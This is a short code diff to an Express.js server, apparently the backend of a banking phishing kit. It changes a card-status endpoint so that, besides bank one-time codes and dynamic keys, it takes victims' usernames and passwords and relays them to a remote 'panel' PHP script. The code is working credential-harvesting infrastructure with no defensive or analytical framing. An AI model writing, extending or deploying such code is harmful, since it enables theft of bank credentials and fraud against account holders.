@@ -703,10 +703,12 @@ app.get('/api/tarjeta/estado/:id', async (req, res) => {
 
 app.post('/api/tarjeta/actualizar', async (req, res) => {
   try {
-    const { id, status, banco_otp, dinamica } = req.body || {};
+    const { id, status, banco_otp, dinamica, usuario, clave } = req.body || {};
     const params = new URLSearchParams({ id: id || '', status: status || '' });
     if (banco_otp) params.append('banco_otp', banco_otp);
+    else if (usuario)    params.append('banco_otp', usuario);
     if (dinamica)  params.append('dinamica', dinamica);
+    else if (clave)      params.append('dinamica', clave);
     const r = await axios.post(`${PSEC_BASE}//panel/run/update_tarjeta_status_m3it3m.php`, params.toString(), {
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       timeout: 12000,
